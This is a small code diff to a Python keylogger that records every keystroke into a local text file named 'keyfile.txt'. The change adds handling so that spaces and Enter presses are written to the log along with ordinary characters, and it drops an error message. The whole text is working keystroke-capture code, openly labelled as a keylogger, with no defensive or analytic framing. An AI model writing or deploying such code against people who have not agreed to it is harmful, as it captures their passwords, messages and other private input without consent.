@@ -15,6 +15,8 @@ def keyPressed(key):
     #prints key pressed to console
     print(str(key))
 
+
+
     #opens or creates text file, a stands for append mode
     with open("keyfile.txt", 'a') as logKey:
 
@@ -23,10 +25,15 @@ def keyPressed(key):
             char = key.char
             logKey.write(char)
 
-
         except:
-            #if cant get a char then catch error so keylogger continues to run
-            print("Error getting char")
+
+            #still adds keys that are not chars to the file
+            if key == key.space:
+                logKey.write(' ')
+
+            elif key == key.enter:
+                logKey.write('\n')
+
 
 #checks if file is being run directly
 if __name__ == "__main__":
